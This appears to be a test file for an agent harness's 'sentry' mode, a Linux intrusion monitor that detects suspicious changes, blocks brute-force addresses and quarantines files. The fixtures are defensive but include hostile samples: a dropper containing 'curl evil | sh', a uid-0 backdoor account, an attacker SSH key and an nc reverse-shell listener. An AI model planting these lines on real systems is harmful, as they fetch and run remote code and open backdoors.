import { existsSync, mkdirSync, readFileSync, statSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import {
  inCidr,
  loginFailures,
  parsePorts,
  privateCidr,
  publicIp,
  snapshot,
  type CheckEnv,
} from '../src/sentry/checks.js';
import { attacks, diff } from '../src/sentry/findings.js';
import type { Run, RunResult } from '../src/sentry/run.js';
import { Sentry, type Alert } from '../src/sentry/sentry.js';
import { automatic, Ledger, lift, raise, refusal } from '../src/sentry/shields.js';
import { sentryTools } from '../src/sentry/tools.js';
import { PolicyEngine } from '../src/policy/engine.js';
import { testConfig, tmpWorkspace } from './helpers.js';

let ws: ReturnType<typeof tmpWorkspace>;
beforeEach(() => (ws = tmpWorkspace()));
afterEach(() => ws.cleanup());

const KEY_A = 'AAAAC3NzaC1lZDI1NTE5AAAAIAaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';
const KEY_EVIL = 'AAAAC3NzaC1lZDI1NTE5AAAAIEvilevilevilevilevilevilevilevilevilevilevil';

/** A small Linux machine on disk, and the programs sentry asks about it. */
class FakeMachine {
  root: string;
  home: string;
  ss = 'tcp LISTEN 0 4096 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=812,fd=3))\n';
  journal = '';
  calls: string[] = [];
  sudoWorks = true;
  nftHasTable = false;

  constructor(dir: string) {
    this.root = join(dir, 'root');
    this.home = join(this.root, 'home/falcon');
    for (const d of [
      'etc/ssh',
      'etc/cron.d',
      'proc',
      'usr/bin',
      'home/falcon/.ssh',
      'home/falcon/.config/autostart',
    ])
      mkdirSync(join(this.root, d), { recursive: true });
    this.file(
      'etc/passwd',
      'root:x:0:0:root:/root:/bin/bash\nfalcon:x:1000:1000::/home/falcon:/bin/bash\nwww-data:x:33:33::/var/www:/usr/sbin/nologin\n',
    );
    this.file('etc/group', 'sudo:x:27:falcon\ndocker:x:998:\n');
    this.file('etc/ssh/sshd_config', 'Port 22\nPermitRootLogin no\nPasswordAuthentication no\n');
    this.file('proc/modules', 'nvidia 1 0 - Live 0x0\next4 1 0 - Live 0x0\n');
    this.file('home/falcon/.ssh/authorized_keys', `ssh-ed25519 ${KEY_A} falcon@laptop\n`);
    this.file('usr/bin/sudo', 'x');
  }

  file(rel: string, text: string) {
    writeFileSync(join(this.root, rel), text);
  }

  run: Run = async (cmd, args, opts = {}) => {
    const line = `${opts.sudo ? 'sudo ' : ''}${cmd} ${args.join(' ')}`;
    this.calls.push(line);
    const ok = (stdout: string): RunResult => ({ ok: true, stdout, stderr: '', code: 0 });
    const fail = (stderr = ''): RunResult => ({ ok: false, stdout: '', stderr, code: 1 });
    if (opts.sudo && !this.sudoWorks) return fail('sudo: a password is required');
    switch (cmd) {
      case 'ss':
        return ok(this.ss);
      case 'systemctl':
        if (args.includes('--type=service'))
          return ok('ssh.service enabled enabled\ncron.service enabled enabled\n');
        if (args.includes('--type=timer')) return ok('apt-daily.timer enabled enabled\n');
        return ok('');
      case 'crontab':
        return fail('no crontab for falcon');
      case 'find':
        return ok(`${this.root}/usr/bin/sudo\n`);
      case 'ip':
        return ok(
          JSON.stringify([{ dst: '192.168.1.1', lladdr: 'aa:bb:cc:00:00:01', state: ['REACHABLE'] }]),
        );
      case 'nmap':
        return { ok: false, stdout: '', stderr: '', code: null, missing: true };
      case 'journalctl':
        return ok(this.journal);
      case 'nft':
        if (args[0] === 'list' && args[1] === 'table')
          return this.nftHasTable ? ok('table inet nexus_sentry {}') : fail('No such file or directory');
        if (args[0] === 'add' && args[1] === 'table') this.nftHasTable = true;
        if (args[0] === '-s') return ok('table inet filter {\n}\n');
        return ok('');
      default:
        return fail(`unknown ${cmd}`);
    }
  };

  env(): CheckEnv {
    return { run: this.run, networks: ['192.168.1.0/24'], root: this.root, home: this.home };
  }
}

describe('what sentry looks at', () => {
  it('reads listening sockets without the process ids, so a restart is not a change', () => {
    expect(
      parsePorts(
        'tcp LISTEN 0 4096 0.0.0.0:22 0.0.0.0:* users:(("sshd",pid=812,fd=3))\n' +
          'udp UNCONN 0 0 [fe80::1%eth0]:546 [::]:* users:(("dhclient",pid=9,fd=5))\n',
      ),
    ).toEqual({ 'tcp 0.0.0.0:22': 'sshd', 'udp [fe80::1]:546': 'dhclient' });
  });

  it('takes a snapshot of the machine, saying which checks cannot run here', async () => {
    const m = new FakeMachine(ws.dir);
    const s = await snapshot(m.env());
    expect(s.checks.users).toEqual({ root: 'uid 0, /bin/bash', falcon: 'uid 1000, /bin/bash' });
    expect(s.checks.admins).toEqual({ 'sudo:falcon': 'falcon in sudo' });
    expect(Object.keys(s.checks.sshKeys ?? {})).toHaveLength(1);
    expect(s.checks.sshd).toMatchObject({ 'PermitRootLogin no': 'no' });
    expect(s.checks.setuid).toHaveProperty('/usr/bin/sudo');
    expect(s.checks.devices).toEqual({ 'aa:bb:cc:00:00:01': '192.168.1.1' });
    expect(s.checks.firewall).toHaveProperty('rules');
    expect(s.checks.services).toEqual({ 'ssh.service': 'enabled', 'cron.service': 'enabled' });
  });

  it('only ever looks for devices on private networks', () => {
    expect(privateCidr('192.168.1.0/24')).toBe(true);
    expect(privateCidr('10.0.0.0/8')).toBe(true);
    expect(privateCidr('8.8.8.0/24')).toBe(false);
    expect(privateCidr('0.0.0.0/0')).toBe(false);
    expect(inCidr('192.168.1.40', '192.168.1.0/24')).toBe(true);
    expect(publicIp('203.0.113.9')).toBe(true);
    expect(publicIp('192.168.1.50')).toBe(false);
    expect(publicIp('100.101.1.2')).toBe(false); // Tailscale
  });

  it('counts failed SSH logins by address', async () => {
    const m = new FakeMachine(ws.dir);
    m.journal =
      'Failed password for root from 203.0.113.9 port 4242 ssh2\n'.repeat(11) +
      'Invalid user admin from 198.51.100.7 port 1 \n' +
      'Accepted publickey for falcon from 192.168.1.20 port 5 ssh2\n';
    const f = await loginFailures(m.env(), 10);
    expect(typeof f === 'object' && f.byIp).toEqual({ '203.0.113.9': 11, '198.51.100.7': 1 });
    if (typeof f === 'object') expect(attacks(f, 10).map((a) => a.key)).toEqual(['203.0.113.9']);
  });
});

describe('what counts as a change', () => {
  it('grades changes by what an intruder does first, and leaves ordinary comings and goings out', async () => {
    const m = new FakeMachine(ws.dir);
    const before = await snapshot(m.env());
    m.file('etc/passwd', readFileSync(join(m.root, 'etc/passwd'), 'utf8') + 'toor:x:0:0::/root:/bin/bash\n');
    m.file(
      'home/falcon/.ssh/authorized_keys',
      `ssh-ed25519 ${KEY_A} falcon@laptop\nssh-ed25519 ${KEY_EVIL} x@evil\n`,
    );
    m.ss +=
      'tcp LISTEN 0 128 0.0.0.0:4444 0.0.0.0:* users:(("nc",pid=4000,fd=3))\n' +
      'tcp LISTEN 0 128 127.0.0.1:5173 0.0.0.0:* users:(("node",pid=4001,fd=3))\n';
    m.file('home/falcon/.config/autostart/updater.desktop', '[Desktop Entry]\nExec=/tmp/.x\n');
    m.file('proc/modules', 'nvidia 1 0 - Live 0x0\n'); // a module unloaded: not news
    const after = await snapshot(m.env());
    const found = diff(before, after);
    const by = (t: string) => found.find((f) => f.title.includes(t));
    expect(by('toor')?.severity).toBe('critical');
    expect(by('x@evil')?.severity).toBe('high');
    expect(by('0.0.0.0:4444')).toMatchObject({ severity: 'medium', detail: 'nc' });
    expect(by('127.0.0.1:5173')?.severity).toBe('low');
    expect(by('updater.desktop')?.severity).toBe('medium');
    expect(found.some((f) => f.check === 'modules')).toBe(false);
  });
});

describe('shields', () => {
  const env = (m: FakeMachine) => ({ run: m.run, dir: join(ws.dir, 'sentry'), protect: ['192.168.1.10'] });

  it("blocks an address for a while with sentry's own nftables table, and lifts it", async () => {
    const m = new FakeMachine(ws.dir);
    const out = await raise(env(m), {
      kind: 'block-ip',
      target: '203.0.113.9',
      reason: 'brute force',
      by: 'sentry',
      minutes: 30,
    });
    expect(out.ok).toBe(true);
    expect(m.calls).toContain('sudo nft add element inet nexus_sentry blocked4 { 203.0.113.9 timeout 30m }');
    expect(m.calls.filter((c) => c.startsWith('sudo nft add table'))).toHaveLength(1);
    if (out.ok) expect(await lift(env(m), out.shield)).toEqual({ ok: true });
    expect(m.calls.at(-1)).toBe('sudo nft delete element inet nexus_sentry blocked4 { 203.0.113.9 }');
  });

  it('says how to do it yourself when sudo needs a password', async () => {
    const m = new FakeMachine(ws.dir);
    m.sudoWorks = false;
    const out = await raise(env(m), { kind: 'block-ip', target: '203.0.113.9', reason: 'x', by: 'agent' });
    expect(out).toMatchObject({ ok: false, error: expect.stringMatching(/run it yourself: sudo nft/) });
  });

  // Unix paths and permissions: sentry only runs on Linux (it refuses to turn on elsewhere).
  it.skipIf(process.platform === 'win32')(
    'quarantines a file without deleting it, and puts it back exactly',
    async () => {
      const m = new FakeMachine(ws.dir);
      const f = join(ws.dir, 'dropper.sh');
      writeFileSync(f, '#!/bin/sh\ncurl evil | sh\n', { mode: 0o755 });
      const out = await raise(env(m), {
        kind: 'quarantine-file',
        target: f,
        reason: 'dropper',
        by: 'sentry',
      });
      expect(out.ok).toBe(true);
      if (!out.ok) return;
      expect(existsSync(f)).toBe(false);
      expect(statSync(out.shield.undo.stored!).mode & 0o777).toBe(0);
      await lift(env(m), out.shield);
      expect(readFileSync(f, 'utf8')).toContain('curl evil');
      expect(statSync(f).mode & 0o777).toBe(0o755);
    },
  );

  // Unix paths and permissions: sentry only runs on Linux (it refuses to turn on elsewhere).
  it.skipIf(process.platform === 'win32')(
    'refuses shields that would break the machine or lock you out',
    () => {
      const e = { protect: ['192.168.1.10'] };
      expect(refusal('quarantine-file', '/usr/bin/sudo', e)).toMatch(/system file/);
      expect(refusal('stop-service', 'ssh.service', e)).toMatch(/keeps the machine/);
      expect(refusal('lock-account', 'root', e)).toMatch(/lock you out/);
      expect(refusal('block-ip', '192.168.1.10', e)).toMatch(/model server/);
      expect(refusal('kill-process', String(process.pid), e)).toMatch(/harness itself/);
      expect(refusal('stop-service', 'evil-miner.service', e)).toBeUndefined();
    },
  );

  it('acts on its own only to block an outside address or quarantine a file you can move', () => {
    const allowed = ['block-ip', 'quarantine-file'] as const;
    expect(automatic('block-ip', '203.0.113.9', [...allowed])).toBe(true);
    expect(automatic('block-ip', '192.168.1.50', [...allowed])).toBe(false); // someone on your LAN: ask
    expect(automatic('block-ip', '203.0.113.9', [])).toBe(false);
    expect(automatic('stop-service', 'x.service', [...allowed])).toBe(false);
  });

  it('keeps a ledger that shows when an entry is changed', () => {
    const l = new Ledger(join(ws.dir, 'ledger'));
    l.append('raised', { kind: 'block-ip', target: '203.0.113.9' });
    l.append('lifted', { id: 'x' });
    expect(l.verify()).toEqual({ ok: true, count: 2 });
    const file = join(ws.dir, 'ledger/ledger.jsonl');
    writeFileSync(file, readFileSync(file, 'utf8').replace('203.0.113.9', '203.0.113.8'));
    expect(l.verify()).toMatchObject({ ok: false, at: 1, why: 'an entry was changed' });
  });
});

describe('sentry mode', () => {
  function sentryOf(m: FakeMachine, alerts: Alert[], over: Record<string, unknown> = {}) {
    const config = testConfig({ sentry: over }).sentry;
    return new Sentry({
      config,
      dir: join(ws.dir, 'data/sentry'),
      run: m.run,
      protect: () => [],
      alert: (a) => alerts.push(a),
      checkEnv: { root: m.root, home: m.home, networks: ['192.168.1.0/24'] },
    });
  }

  it('takes a baseline, reports each new change once, and stops reporting it once accepted', async () => {
    const m = new FakeMachine(ws.dir);
    const alerts: Alert[] = [];
    const s = sentryOf(m, alerts);
    expect((await s.start()).newBaseline).toBe(true);
    expect(await s.sweep()).toEqual([]);
    m.file(
      'home/falcon/.ssh/authorized_keys',
      `ssh-ed25519 ${KEY_A} falcon@laptop\nssh-ed25519 ${KEY_EVIL} x@evil\n`,
    );
    const first = await s.sweep();
    expect(first).toHaveLength(1);
    expect(alerts.at(-1)).toMatchObject({
      level: 'high',
      text: expect.stringContaining('New SSH login key'),
    });
    expect(await s.sweep()).toEqual([]); // not again
    expect(await s.acceptFindings(first[0]!.id)).toMatch(/Accepted 1 change/);
    expect(s.status().open).toEqual([]);
    expect(await s.sweep()).toEqual([]);
    expect(s.status().ledger).toEqual({ ok: true, count: 2 }); // baseline, accepted
    s.stop();
  });

  it('blocks an outside address trying passwords, on its own, and only asks about one on the LAN', async () => {
    const m = new FakeMachine(ws.dir);
    const alerts: Alert[] = [];
    const s = sentryOf(m, alerts);
    await s.start();
    m.journal =
      'Failed password for root from 203.0.113.9 port 1 ssh2\n'.repeat(15) +
      'Failed password for falcon from 192.168.1.77 port 1 ssh2\n'.repeat(15);
    await s.sweep();
    const st = s.status();
    expect(st.shields.map((x) => `${x.kind} ${x.target} ${x.by}`)).toEqual(['block-ip 203.0.113.9 sentry']);
    expect(st.open.map((f) => f.key)).toEqual(['192.168.1.77']); // the outside one is shielded
    expect(alerts.some((a) => a.text.startsWith('Shield up (automatic): block-ip 203.0.113.9'))).toBe(true);
    s.stop();
  });

  it('hands medium and worse findings to the sentry agent once the main agent is free', async () => {
    const m = new FakeMachine(ws.dir);
    const alerts: Alert[] = [];
    let busy = true;
    const seen: string[] = [];
    const s = new Sentry({
      config: testConfig().sentry,
      dir: join(ws.dir, 'data/sentry'),
      run: m.run,
      protect: () => [],
      alert: (a) => alerts.push(a),
      idle: () => !busy,
      investigate: async (f) => {
        seen.push(...f.map((x) => x.title));
        return 'nc on 4444 is a reverse shell started from /tmp/.x: malicious. Killed it.';
      },
      checkEnv: { root: m.root, home: m.home, networks: [] },
    });
    await s.start();
    m.ss += 'tcp LISTEN 0 128 0.0.0.0:4444 0.0.0.0:* users:(("nc",pid=4000,fd=3))\n';
    await s.sweep();
    expect(seen).toEqual([]); // the main agent was busy
    busy = false;
    await s.kick();
    expect(seen).toEqual(['New listening port: tcp 0.0.0.0:4444 (nc)']);
    expect(alerts.at(-1)?.text).toMatch(/^Sentry report: nc on 4444 is a reverse shell/);
    expect(s.findings()[0]!.report).toMatch(/reverse shell/);
    s.stop();
  });

  it('asks before every shield except the automatic kinds, even in auto mode', () => {
    const m = new FakeMachine(ws.dir);
    const s = sentryOf(m, []);
    const [, shield] = sentryTools(s, ['block-ip', 'quarantine-file'], () => []);
    const auto = new PolicyEngine({ mode: 'auto', rules: [] });
    const decide = (input: Record<string, unknown>) => auto.decide(shield!, input).action;
    expect(decide({ action: 'raise', kind: 'block-ip', target: '203.0.113.9', reason: 'x' })).toBe('allow');
    expect(decide({ action: 'raise', kind: 'block-ip', target: '192.168.1.77', reason: 'x' })).toBe('ask');
    expect(decide({ action: 'raise', kind: 'stop-service', target: 'x.service', reason: 'x' })).toBe('ask');
    expect(decide({ action: 'lift', id: 'abc', reason: 'x' })).toBe('ask');
    // In ask mode too: the automatic kinds go ahead (the live run caught them asking), the rest ask.
    const ask = new PolicyEngine({ mode: 'ask', rules: [] });
    const own = join(ws.dir, 'dropper.desktop');
    writeFileSync(own, 'x');
    expect(
      ask.decide(shield!, { action: 'raise', kind: 'quarantine-file', target: own, reason: 'x' }).action,
    ).toBe('allow');
    expect(
      ask.decide(shield!, { action: 'raise', kind: 'kill-process', target: '4000', reason: 'x' }).action,
    ).toBe('ask');
    // An earlier "always allow" does not carry over.
    auto.grant(shield!, { action: 'raise', kind: 'kill-process', target: '4000', reason: 'x' });
    expect(decide({ action: 'raise', kind: 'kill-process', target: '4000', reason: 'x' })).toBe('ask');
  });
});

describe('sentry in the harness', () => {
  it('is off until you turn it on: no sentry tools, no sentry prompt, nothing watched', async () => {
    const { Runtime } = await import('../src/runtime.js');
    const rt = await Runtime.create({
      cwd: ws.dir,
      ephemeral: true,
      env: { ...process.env, NEXUS_HOME: join(ws.dir, 'home') },
      overrides: { model: 'p/m', providers: { p: { type: 'openai', baseUrl: 'http://127.0.0.1:9/v1' } } },
    });
    expect(rt.sentry).toBeUndefined();
    expect(rt.tools.get('sentry_shield')).toBeUndefined();
    expect(rt.systemPrompt('main')).not.toContain('# Sentry mode');
    expect(rt.sentryOff()).toBe('Sentry is off.');
    await rt.dispose();
  });
});
